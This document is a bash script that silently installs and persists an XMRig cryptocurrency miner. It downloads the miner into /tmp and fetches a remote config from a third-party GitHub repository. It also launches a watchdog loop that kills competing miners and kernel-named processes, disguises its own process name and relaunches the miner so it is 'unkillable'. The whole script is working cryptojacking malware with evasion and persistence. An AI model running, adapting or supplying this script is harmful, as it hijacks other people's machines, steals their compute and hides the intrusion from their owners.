#!/bin/bash

xmrver="6.22.2"

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

unalias -a

sudo -n apt update
sudo -n apt install -y wget util-linux dos2unix
sudo -n apk add wget util-linux
sudo -n dnf install wget util-linux

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -OL"
fi

mkdir -p /tmp/xmrig
cd /tmp/xmrig

$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
cd xmrig-$xmrver

chmod +x xmrig

rm -f config.json
$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/texniaz/main/config.json

randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/kasm/kasm-$randnum/g" config.json

echo "ANTI-KILLER LOOP ENABLED"

cat <<EOF > killer.sh
#!/bin/bash
while true; do
  pkill -f xmrig
  pkill -f minerd
  pkill -f kworker
  pkill -f kthreadd
  echo "texniaz" > /proc/\$$/comm
  if ! pgrep -f xmrig; then
    nohup ./xmrig > /dev/null 2>&1 &
  fi
  sleep 10
done
EOF

chmod +x killer.sh

nohup ./killer.sh > /dev/null 2>&1 &
nohup ./xmrig > /dev/null 2>&1 &
clear
echo "TEXNIAZ MINER INSTALLED 💀🔥 - UNKILLABLE 🧠"
